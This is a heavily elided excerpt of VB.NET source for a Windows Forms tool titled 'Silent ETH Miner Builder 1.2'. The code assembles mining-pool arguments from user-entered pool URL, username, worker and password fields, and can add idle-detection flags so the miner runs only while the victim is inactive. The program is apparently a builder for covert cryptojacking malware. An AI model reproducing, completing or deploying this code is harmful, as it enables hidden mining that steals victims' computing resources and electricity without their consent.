...
Public Class Form1
    ...
    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            MephForm1.Text = "Silent ETH Miner Builder 1.2"
    ...
    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        ...
        Try
            ...
            Dim argstr As String = If(chkAdvanced.Checked, txtAdvParam.Text, advancedParams) & " --pool " & txtPoolScheme.Text.Split(" "c)(0) & "://" & txtPoolUsername.Text & If(String.IsNullOrEmpty(txtPoolWorker.Text), "", "." & txtPoolWorker.Text) & If(String.IsNullOrEmpty(txtPoolPassowrd.Text), "", ":" & txtPoolPassowrd.Text) & If(String.IsNullOrEmpty(txtPoolUsername.Text), "", "@") & txtPoolURL.Text & If(String.IsNullOrEmpty(txtPoolData.Text), "", "/" & txtPoolData.Text) & " "
            ...
            If toggleEnableIdle.Checked Then
                argstr += " --unam-idle --unam-idle-wait=" & txtIdleWait.Text & " "
            End If
    ...
    Private Sub MephForm1_Click(sender As Object, e As EventArgs) Handles MephForm1.Click
